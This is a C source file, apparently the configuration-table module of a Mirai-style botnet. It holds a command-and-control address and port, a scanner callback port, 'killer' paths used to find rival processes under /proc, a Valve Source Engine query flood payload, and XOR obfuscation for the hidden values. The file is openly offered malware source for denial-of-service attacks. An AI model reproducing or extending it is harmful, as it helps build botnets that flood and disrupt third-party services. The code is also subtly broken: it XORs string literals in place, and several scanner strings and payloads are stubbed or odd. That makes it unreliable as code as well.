#include "includes.h"
#include "table.h"
#include "util.h"

static char *table[TABLE_MAX_KEYS];
static BOOL locked[TABLE_MAX_KEYS];

/* XOR encryption/decryption */
static void toggle_obf(uint8_t id) {
    int i;
    for (i = 0; i < util_strlen(table[id]); i++)
        table[id][i] ^= TABLE_KEY;
}

void table_init(void) {
    /* CNC configuration */
    table[TABLE_CNC_DOMAIN] = "127.0.0.1";
    table[TABLE_CNC_PORT] = "3778";
    table[TABLE_SCAN_CB_PORT] = "9555";

    /* Scanner strings */
    table[TABLE_SCAN_SHELL] = "shell";
    table[TABLE_SCAN_ENABLE] = "enable";
    table[TABLE_SCAN_SYSTEM] = "system";
    table[TABLE_SCAN_CREDENTIALS] = "credentials";
    table[TABLE_SCAN_TOKEN] = "token";
    table[TABLE_EXEC_SUCCESS] = "success";

    /* Killer paths */
    table[TABLE_KILLER_PROC] = "/proc/";
    table[TABLE_KILLER_EXE] = "/exe";
    table[TABLE_KILLER_FD] = "/fd";
    table[TABLE_KILLER_TCP] = "/proc/net/tcp";

    /* Attack payloads */
    /* VSE payload: \xFF\xFF\xFF\xFF\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00 */
    table[TABLE_ATK_VSE] = "\xFF\xFF\xFF\xFF\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00";
    table[TABLE_ATK_DNS] = "";
    table[TABLE_ATK_UDP] = "";

    /* Misc */
    table[TABLE_MISC_RAND] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    table[TABLE_MISC_WATCHDOG] = "/watchdog";

    /* Initialize lock status */
    for (int i = 0; i < TABLE_MAX_KEYS; i++)
        locked[i] = FALSE;

    /* Lock sensitive values */
    table_lock_val(TABLE_CNC_DOMAIN);
    table_lock_val(TABLE_CNC_PORT);
    table_lock_val(TABLE_SCAN_CB_PORT);
}

void table_unlock_val(uint8_t id) {
    if (locked[id]) {
        toggle_obf(id);
        locked[id] = FALSE;
    }
}

void table_lock_val(uint8_t id) {
    if (!locked[id]) {
        toggle_obf(id);
        locked[id] = TRUE;
    }
}

char *table_retrieve_val(int id, int *len) {
    if (table[id] == NULL) return NULL;
    *len = util_strlen(table[id]);
    return table[id];
}
